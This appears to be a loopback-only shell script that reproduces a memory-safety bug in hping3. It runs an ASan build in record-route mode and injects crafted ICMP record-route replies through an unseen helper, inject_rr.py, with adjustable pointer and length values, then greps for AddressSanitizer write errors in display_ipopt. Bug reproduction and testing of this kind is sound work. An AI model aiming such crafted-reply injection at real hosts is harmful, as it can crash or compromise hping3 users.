#!/bin/sh
# Loopback-only wire test: real ASan hping -G, crafted RR reply injection.
set -u
cd "$(dirname "$0")"
BIN=${BIN:-./hping-src/hping3}
PIDFILE=payload.pid
OUT=${1:-wire-attack.out}
PTR=${2:-72}
RR=${3:-255}
rm -f "$PIDFILE" "$OUT"
sudo -n sh -c "echo \$\$ > $PIDFILE; exec $BIN -D -1 -G -I lo -c 3 -i 1 127.0.0.2" >"$OUT" 2>&1 &
hp=$!
for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -s "$PIDFILE" ] && break
    sleep 0.1
done
pid=$(cat "$PIDFILE" 2>/dev/null || echo 0)
echo "hping_shell_pid=$pid launcher_pid=$hp"
if [ "$pid" -eq 0 ]; then echo "FAIL: no hping pid"; exit 2; fi
sudo -n python3 inject_rr.py --pid "$pid" --ptr "$PTR" --rr-len "$RR" --count 30 --gap 0.03
wait "$hp"
rc=$?
echo "hping_rc=$rc"
grep -E 'ERROR: AddressSanitizer|WRITE of size|display_ipopt|SUMMARY: AddressSanitizer|icmp_seq|RR:' "$OUT" | head -40
exit "$rc"
